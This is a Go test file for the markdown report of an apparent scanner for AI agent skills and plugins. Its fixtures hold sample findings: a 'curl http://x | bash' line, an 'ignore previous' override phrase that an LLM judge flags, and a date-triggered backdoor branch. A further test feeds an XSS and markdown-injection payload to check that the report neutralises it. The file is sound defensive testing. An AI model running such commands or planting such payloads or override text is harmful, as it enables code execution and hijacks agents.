// SPDX-License-Identifier: MIT
package report

import (
	"bytes"
	"regexp"
	"strings"
	"testing"

	"github.com/basdotio/agent-guard/internal/model"
	"github.com/basdotio/agent-guard/internal/score"
)

// mdFixture is a small result with every section the markdown report has to place: two
// deterministic groups (one actionable, one informational), one judge lead, one advisory
// dimension-7 hit, a trust note and a coverage note, hygiene, locations.
func mdFixture() model.ScanResult {
	return model.ScanResult{
		Root: "/home/u/.claude", ToolVersion: "test", Overall: 40, OverallEffective: 40,
		Env: model.EnvSummary{Skills: 2, Plugins: 1},
		Artifacts: []model.ArtifactReport{
			{Kind: model.KindSkill, Name: "evil", Score: 10, ScoreEffective: 10, Findings: []model.Finding{
				{RuleID: "EXEC-001", Dimension: 4, Severity: model.SevHigh, Title: "curl piped to shell", Why: "remote code execution", Source: model.SrcStatic,
					Evidence: []model.Evidence{{File: "skills/evil/install.sh", Line: 3, Snippet: "curl http://x | bash"}}},
				{RuleID: "BACK-001", Dimension: 7, Severity: model.SevMedium, Title: "time-conditioned branch", Why: "behaves differently on a date", Source: model.SrcStatic, Advisory: true,
					Evidence: []model.Evidence{{File: "skills/evil/run.py", Line: 9, Snippet: "if date == X"}}},
				{RuleID: "LLM-002", Dimension: 1, Severity: model.SevHigh, Title: "judge: hidden instruction", Why: "the model read it as a jailbreak", Source: model.SrcLLM,
					Evidence: []model.Evidence{{File: "skills/evil/SKILL.md", Line: 5, Snippet: "ignore previous"}}},
			}},
			{Kind: model.KindSkill, Name: "meh", Score: 90, ScoreEffective: 90, Findings: []model.Finding{
				{RuleID: "INJ-004", Dimension: 1, Severity: model.SevLow, Title: "imperative phrasing", Why: "weak signal", Source: model.SrcStatic,
					Evidence: []model.Evidence{{File: "skills/meh/SKILL.md", Line: 2, Snippet: "always do X"}}},
			}},
		},
		Notes: []model.Finding{
			{RuleID: "REP-GOOD", Dimension: 0, Severity: model.SevHigh, Title: "Findings suppressed by the embedded allowlist", Why: "superpowers: 18 findings suppressed. Reviewed 2026-09-01: read in full.",
				Evidence: []model.Evidence{{File: "plugins/cache/m/superpowers/1.0/"}}},
			{RuleID: "COV-000", Dimension: 0, Severity: model.SevMedium, Title: "File too large, not read", Why: "Not read: big.bin. Over the size cap.",
				Evidence: []model.Evidence{{File: "skills/evil/big.bin"}}},
		},
		Hygiene:   []model.CleanItem{{Kind: "context_bloat", Targets: []string{"skills/meh"}, ReclaimTokens: 42, Detail: "verbose description"}},
		Locations: []model.Location{{Name: "Config root", Path: "/home/u/.claude", Status: model.LocRead}, {Name: "Downloads", Path: "/home/u/Downloads", Status: model.LocOff}},
	}
}

func renderMD(t *testing.T, r model.ScanResult) string {
	t.Helper()
	var b bytes.Buffer
	if err := Markdown(&b, r); err != nil {
		t.Fatal(err)
	}
	return b.String()
}

// TestMarkdown_ReadsForNonSpecialists: the same reading order as the terminal — score, one plain
// sentence, what to look at, every finding (static and judge apart), what was trusted, what was
// not checked, the auditor's details last — and both scores when they differ, one when they do not.
func TestMarkdown_ReadsForNonSpecialists(t *testing.T) {
	r := mdFixture()
	out := renderMD(t, r)
	anchors := []string{
		"Risk score 40/100",
		verdictSentence(score.Level(40), 2, 3),
		"What to look at",
		"## Findings · static",
		"| `EXEC-001` |",
		"## Findings · LLM judge",
		"| `LLM-002` |",
		"## Trusted by allowlist",
		"## Not checked",
		"## Scan details",
		"Where the scan looked",
		"Static analysis only",
	}
	last := -1
	for _, a := range anchors {
		i := strings.Index(out, a)
		if i < 0 {
			t.Fatalf("missing %q in:\n%s", a, out)
		}
		if i < last {
			t.Errorf("%q appears before the previous anchor; order is the point of this report:\n%s", a, out)
		}
		last = i
	}
	if strings.Contains(out, "with LLM advisories") {
		t.Error("equal scores must collapse to one line")
	}
	r.OverallEffective = 25
	out = renderMD(t, r)
	if !strings.Contains(out, "with LLM advisories: 25/100") || !strings.Contains(out, "does not gate") {
		t.Errorf("differing scores must both be shown, labelled:\n%s", out)
	}
	// Every finding is present, in the static or the judge section, never folded away.
	for _, id := range []string{"EXEC-001", "BACK-001", "INJ-004", "LLM-002"} {
		if !strings.Contains(out, id) {
			t.Errorf("finding %s missing", id)
		}
	}
	if !strings.Contains(out, "advisory: not confirmed") {
		t.Error("a dimension-7 static hit must keep its advisory label (spec §16 invariant 6)")
	}
}

// codeSpan matches an inline code span of any backtick length; stripping them leaves the text
// that GitHub would interpret as markup.
var codeSpan = regexp.MustCompile("(`+)[^`]*?`+")

// TestMarkdown_AttackerTextIsInert: names, paths and snippets come from the scanned tree. In a
// PR comment a bare `@user` pings someone, `[x](url)` is a link, `<img>` is a tracking pixel,
// `|` splits a table cell and a bidi override rewrites what the reader sees. All of it must
// arrive only inside code spans, and the table must keep its shape.
func TestMarkdown_AttackerTextIsInert(t *testing.T) {
	const payload = "| x | [a](http://evil.example) @octocat #4242 <img src=x onerror=alert(1)> `tick` ``two``"
	r := mdFixture()
	r.Artifacts[0].Name = "evil‮​"
	r.Artifacts[0].Findings[0].Evidence[0].Snippet = payload
	r.Artifacts[0].Findings[0].Evidence[0].File = "skills/evil/" + payload + ".sh"
	out := renderMD(t, r)

	for _, bad := range []string{"‮", "​"} {
		if strings.Contains(out, bad) {
			t.Errorf("bidi/zero-width character survived into the markdown")
		}
	}
	if !strings.Contains(out, "@octocat") || !strings.Contains(out, "onerror") {
		t.Fatalf("payload was dropped rather than neutralised — the reader must still see what was found:\n%s", out)
	}
	stripped := codeSpan.ReplaceAllString(out, "")
	for _, bad := range []string{"@octocat", "](", "<img", "onerror", "#4242", "``"} {
		if strings.Contains(stripped, bad) {
			t.Errorf("%q appears outside a code span:\n%s", bad, out)
		}
	}
	// Table shape: every row of the findings table has the same number of unescaped pipes.
	var rows []string
	inTable := false
	for _, line := range strings.Split(out, "\n") {
		if strings.HasPrefix(line, "|") {
			inTable = true
			rows = append(rows, line)
		} else if inTable && strings.TrimSpace(line) == "" {
			break
		}
	}
	if len(rows) < 3 {
		t.Fatalf("expected a findings table (header, separator, rows):\n%s", out)
	}
	want := unescapedPipes(rows[0])
	for _, row := range rows {
		if got := unescapedPipes(row); got != want {
			t.Errorf("table row has %d pipes, header has %d — a '|' in the payload split the row:\n%s", got, want, row)
		}
	}
}

func unescapedPipes(s string) int {
	n := 0
	for i, c := range s {
		if c == '|' && (i == 0 || s[i-1] != '\\') {
			n++
		}
	}
	return n
}

// TestMarkdown_NotesFoldButCarryTheirSeverity: coverage notes fold into <details> (the
// markdown equivalent of the terminal's one-line summary), and the <summary> line still says
// how many and how bad — invariant #8: the default view may say less about a gap, never nothing.
// Trust decisions do not fold: they changed the score.
func TestMarkdown_NotesFoldButCarryTheirSeverity(t *testing.T) {
	out := renderMD(t, mdFixture())
	i := strings.Index(out, "## Not checked")
	if i < 0 {
		t.Fatal("no 'Not checked' section")
	}
	sect := out[i:]
	if j := strings.Index(sect, "\n## "); j > 0 {
		sect = sect[:j]
	}
	if !strings.Contains(sect, "<details>") || !strings.Contains(sect, "<summary>") {
		t.Errorf("coverage notes should fold into <details>:\n%s", sect)
	}
	summary := sect[strings.Index(sect, "<summary>"):strings.Index(sect, "</summary>")]
	if !strings.Contains(summary, "1 coverage note") || !strings.Contains(summary, "medium") || !strings.Contains(summary, "COV-000") {
		t.Errorf("the summary line must carry the count, the highest severity and the ids: %q", summary)
	}
	if !strings.Contains(sect, "big.bin") {
		t.Error("the folded body must still name what was not read")
	}
	tr := out[strings.Index(out, "## Trusted by allowlist"):]
	if k := strings.Index(tr, "\n## "); k > 0 {
		tr = tr[:k]
	}
	if strings.Contains(tr, "<details>") {
		t.Error("trust decisions changed the score and must not fold")
	}
	if !strings.Contains(tr, "suppressed, not absent") || !strings.Contains(tr, "high") {
		t.Errorf("a suppression must say the findings were suppressed and how severe the worst was:\n%s", tr)
	}
}

// TestMarkdown_CleanAndCheck: no findings is said in words, and a `check` result (no
// locations, no inbox) renders without empty sections.
func TestMarkdown_CleanAndCheck(t *testing.T) {
	r := model.ScanResult{Root: "./some-skill", ToolVersion: "test", Overall: 100, OverallEffective: 100, Env: model.EnvSummary{Skills: 1}}
	out := renderMD(t, r)
	if !strings.Contains(out, "No risk findings") {
		t.Errorf("clean result must say so:\n%s", out)
	}
	for _, absent := range []string{"Where the scan looked", "Downloads", "Trusted by allowlist", "Not checked", "Junk"} {
		if strings.Contains(out, absent) {
			t.Errorf("empty section %q should be omitted:\n%s", absent, out)
		}
	}
}
